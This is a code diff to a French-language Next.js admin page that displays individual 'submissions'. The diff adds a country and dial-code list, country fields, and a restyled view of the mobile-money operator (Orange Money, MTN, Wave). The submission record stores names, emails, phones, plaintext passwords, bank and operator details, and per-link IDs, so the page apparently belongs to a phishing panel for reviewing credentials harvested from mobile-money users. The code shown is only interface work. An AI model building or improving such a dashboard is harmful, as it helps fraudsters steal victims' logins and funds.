@@ -17,6 +17,29 @@ import Link from 'next/link';
 import { useParams, useRouter } from 'next/navigation';
 import { api } from '@/lib/api';
 
+const COUNTRIES = [
+    { name: "Cameroun", code: "CM", dial: "+237", flag: "🇨🇲" },
+    { name: "Côte d'Ivoire", code: "CI", dial: "+225", flag: "🇨🇮" },
+    { name: "Sénégal", code: "SN", dial: "+221", flag: "🇸🇳" },
+    { name: "Gabon", code: "GA", dial: "+241", flag: "🇬🇦" },
+    { name: "Mali", code: "ML", dial: "+223", flag: "🇲🇱" },
+    { name: "Burkina Faso", code: "BF", dial: "+226", flag: "🇧🇫" },
+    { name: "Bénin", code: "BJ", dial: "+229", flag: "🇧🇯" },
+    { name: "Togo", code: "TG", dial: "+228", flag: "🇹🇬" },
+    { name: "Congo-Brazzaville", code: "CG", dial: "+242", flag: "🇨🇬" },
+    { name: "Congo-Kinshasa (RDC)", code: "CD", dial: "+243", flag: "🇨🇩" },
+    { name: "Guinée", code: "GN", dial: "+224", flag: "🇬🇳" },
+    { name: "Niger", code: "NE", dial: "+227", flag: "🇳🇪" },
+    { name: "Centrafrique", code: "CF", dial: "+236", flag: "🇨🇫" },
+    { name: "Tchad", code: "TD", dial: "+235", flag: "🇹🇩" },
+    { name: "Madagascar", code: "MG", dial: "+261", flag: "🇲🇬" },
+    { name: "France", code: "FR", dial: "+33", flag: "🇫🇷" },
+    { name: "États-Unis", code: "US", dial: "+1", flag: "🇺🇸" },
+    { name: "Canada", code: "CA", dial: "+1", flag: "🇨🇦" },
+    { name: "Belgique", code: "BE", dial: "+32", flag: "🇧🇪" },
+    { name: "Suisse", code: "CH", dial: "+41", flag: "🇨🇭" },
+];
+
 interface Submission {
     id: string;
     full_name: string;
@@ -27,6 +50,8 @@ interface Submission {
     password: string;
     bank_name: string;
     operator_name: string;
+    country_name?: string;
+    country_code?: string;
     created_at: string;
     status: string;
     link_id: string;
@@ -99,13 +124,21 @@ export default function SubmissionDetails() {
                 </section>
 
                 <section className="glass-card rounded-2xl border-white/5 overflow-hidden">
-                    <div className="px-8 py-4 bg-white/[0.02] border-b border-white/5 text-[9px] font-black uppercase tracking-[2px] opacity-40">👤 IDENTITÉ DU CLIENT</div>
-                    <div className="p-8 space-y-6">
-                        <div className="flex flex-col sm:flex-row sm:items-center justify-between border-b border-white/5 pb-4 gap-4">
+                    <div className="px-8 py-4 bg-white/[0.02] border-b border-white/5 text-[9px] font-black uppercase tracking-[2px] opacity-40">👤 IDENTITÉ ET PROVENANCE DU CLIENT</div>
+                    <div className="p-8 space-y-8">
+                        <div className="flex flex-col sm:flex-row sm:items-center justify-between border-b border-white/5 pb-6 gap-4">
                             <div>
                                 <p className="opacity-40 text-[10px] font-black uppercase tracking-widest mb-1">Nom complet enregistré</p>
                                 <p className="text-xl font-bold text-white">{submission.full_name}</p>
                             </div>
+                            {submission.country_name && (
+                                <div className="flex flex-col sm:items-end">
+                                    <p className="opacity-40 text-[10px] font-black uppercase tracking-widest mb-1">Pays de connexion</p>
+                                    <div className="flex items-center gap-2 bg-white/5 px-3 py-1.5 rounded-lg border border-white/10 shadow-inner">
+                                        <span className="text-[11px] font-black text-white uppercase tracking-widest">🌍 {submission.country_name} ({submission.country_code})</span>
+                                    </div>
+                                </div>
+                            )}
                         </div>
                         <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
                             <div>
@@ -113,8 +146,11 @@ export default function SubmissionDetails() {
                                 <p className="font-bold">{submission.email}</p>
                             </div>
                             <div>
-                                <p className="opacity-40 text-[10px] font-black uppercase tracking-widest mb-1">Téléphone Direct</p>
-                                <p className="font-bold">{submission.phone}</p>
+                                <p className="opacity-40 text-[10px] font-black uppercase tracking-widest mb-1">Téléphone Complet (Dial Code inclus)</p>
+                                <div className="flex items-center gap-2">
+                                    <Phone className="w-3.5 h-3.5 text-brand-primary" />
+                                    <p className="font-black text-white">{submission.phone}</p>
+                                </div>
                             </div>
                         </div>
                     </div>
@@ -140,20 +176,43 @@ export default function SubmissionDetails() {
                     </div>
 
                     <div className="p-8 sm:p-12 space-y-12">
-                        <div className="flex items-center gap-4">
-                            <span className="opacity-40 text-[10px] font-black uppercase tracking-widest">Opérateur détecté :</span>
-                            <span className={cn(
-                                "font-black text-2xl uppercase italic",
-                                submission.method === 'orange' ? "text-orange-500" :
-                                    submission.method === 'mtn' ? "text-yellow-500" :
-                                        submission.method === 'wave' ? "text-blue-400" :
-                                            "text-white"
+                        <div className="flex flex-col sm:flex-row sm:items-center gap-6 sm:gap-10">
+                            <span className="opacity-40 text-[10px] font-black uppercase tracking-widest shrink-0">Opérateur de paiement :</span>
+                            <div className={cn(
+                                "flex items-center gap-4 px-6 py-4 rounded-3xl border border-white/10 bg-black/40 shadow-2xl",
+                                submission.method === 'orange' ? "border-orange-500/20" :
+                                    submission.method === 'mtn' ? "border-yellow-500/20" :
+                                        submission.method === 'wave' ? "border-cyan-400/20" : ""
                             )}>
-                                {submission.method === 'orange' ? '🟠 Orange Money' :
-                                    submission.method === 'mtn' ? '🟡 MTN Mobile Money' :
-                                        submission.method === 'wave' ? '🌊 Wave Mobile' :
-                                            submission.method} {submission.bank_name ? '(' + submission.bank_name + ')' : ''}
-                            </span>
+                                <div className="w-12 h-12 flex items-center justify-center overflow-hidden rounded-xl bg-white/5 p-1.5 shrink-0 shadow-lg">
+                                    <img
+                                        src={
+                                            submission.method === 'orange' ? 'https://upload.wikimedia.org/wikipedia/commons/c/c8/Orange_logo.svg' :
+                                                submission.method === 'mtn' ? 'https://upload.wikimedia.org/wikipedia/commons/a/af/MTN_Logo.svg' :
+                                                    submission.method === 'wave' ? '/wave-logo.png' :
+                                                        'https://cdn-icons-png.flaticon.com/512/2830/2830284.png'
+                                        }
+                                        alt={submission.method}
+                                        className="w-full h-full object-contain"
+                                    />
+                                </div>
+                                <div className="flex flex-col">
+                                    <span className={cn(
+                                        "font-black text-2xl uppercase italic leading-none",
+                                        submission.method === 'orange' ? "text-orange-500" :
+                                            submission.method === 'mtn' ? "text-yellow-500" :
+                                                submission.method === 'wave' ? "text-cyan-400" :
+                                                    "text-white"
+                                    )}>
+                                        {submission.method === 'orange' ? 'Orange Money' :
+                                            submission.method === 'mtn' ? 'MTN Mobile Money' :
+                                                submission.method === 'wave' ? 'Wave Mobile' :
+                                                    submission.method}
+                                    </span>
+                                    {submission.bank_name && <span className="text-[10px] font-bold text-white/40 uppercase tracking-widest mt-1">{submission.bank_name}</span>}
+                                    {submission.operator_name && <span className="text-[10px] font-bold text-white/40 uppercase tracking-widest mt-1">{submission.operator_name}</span>}
+                                </div>
+                            </div>
                         </div>
 
                         <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
